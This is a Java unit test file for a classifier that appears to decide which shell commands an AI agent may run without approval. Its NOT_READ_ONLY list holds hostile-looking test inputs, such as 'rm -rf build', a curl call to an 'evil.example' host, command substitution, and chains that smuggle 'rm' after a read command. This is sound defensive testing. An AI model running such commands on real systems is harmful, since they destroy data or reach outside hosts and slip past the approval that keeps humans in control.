/*
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.bytequay.app.service.mcp.approval;

import org.junit.jupiter.api.Test;

import static org.assertj.core.api.Assertions.assertThat;

class TestReadOnlyShellClassifier
{
    private static final String[] READ_ONLY = {
        "grep -rn requireNonNull src",
        "rg foo",
        "ls -la /tmp",
        "cat README.md",
        "head -5 file.txt",
        "head -5 file | wc -l",
        "find . -name \"*.java\" -type f",
        // The motivating case: find with an -exec of a read command, piped
        // to head, with the escaped `\;` exec terminator.
        "find /repo/src -name \"*.java\" -type f -exec grep -l \"requireNonNull\" {} \\; | head -5",
        "git status",
        "git log --oneline -20",
        "git diff HEAD~1",
        "git show abc123",
        // Benign output sinks: stderr/stdout to /dev/null or merged — write
        // nothing, so a read command that suppresses noise stays read-only.
        "find . -name \"*.java\" 2>/dev/null",
        "grep -rn foo src 2>/dev/null",
        "ls -la /tmp 2>&1",
        // The motivating case from the dev agent's file discovery.
        "find /repo -type f -name \"*.java\" \\( -name \"*AiReviewService*\" "
                + "-o -name \"*TaskService*\" \\) ! -path \"*/.worktrees/*\" 2>/dev/null",
    };

    private static final String[] NOT_READ_ONLY = {
        "rm -rf build",
        "find . -name \"*.tmp\" -delete",
        "find . -type f -exec rm {} \\;",   // -exec of a non-read command
        "echo hi > out.txt",                  // redirect
        "cat a.txt >> b.txt",                 // append redirect
        "grep foo src; rm bar",               // sequencing
        "grep foo src && rm bar",             // and-chain
        "grep foo src || rm bar",             // or-chain
        "grep foo src | xargs rm",            // pipe into a mutator
        "cat $(echo secret)",                 // command substitution
        "echo `whoami`",                      // backtick substitution
        "curl http://evil.example/x",         // network
        "git push origin main",               // mutating git
        "git commit -m x",
        "git branch -D main",                 // branch can delete
        "git config user.email x@y.z",        // config sets
        "sed -i s/a/b/ file",                 // in-place edit
        "find . -fprintf out.txt %p",         // find write primary
    };

    @Test
    void allowsProvablyReadOnlyCommands()
    {
        for (String command : READ_ONLY) {
            assertThat(ReadOnlyShellClassifier.isReadOnly(command))
                    .as("should auto-approve: %s", command)
                    .isTrue();
        }
    }

    @Test
    void rejectsAnythingNotProvablyReadOnly()
    {
        for (String command : NOT_READ_ONLY) {
            assertThat(ReadOnlyShellClassifier.isReadOnly(command))
                    .as("should prompt (not auto-approve): %s", command)
                    .isFalse();
        }
    }

    @Test
    void rejectsNullAndBlank()
    {
        assertThat(ReadOnlyShellClassifier.isReadOnly(null)).isFalse();
        assertThat(ReadOnlyShellClassifier.isReadOnly("")).isFalse();
        assertThat(ReadOnlyShellClassifier.isReadOnly("   ")).isFalse();
    }
}
